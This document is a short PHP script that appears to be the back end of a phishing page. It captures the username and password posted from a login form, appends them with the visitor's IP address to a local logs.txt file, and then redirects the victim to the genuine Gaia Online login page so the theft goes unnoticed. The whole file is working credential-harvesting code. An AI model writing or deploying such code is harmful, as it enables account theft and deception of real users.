<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$ip = $_SERVER['REMTOE_ADDR'];
$file = fopen("logs.txt","a");
fwrite($file, "Username: " . $user . " Password: " . $pass . " IP: " . $ip . "\n\n");
fclose($file);
header("location: http://gaiaonline.com/auth/login");
?>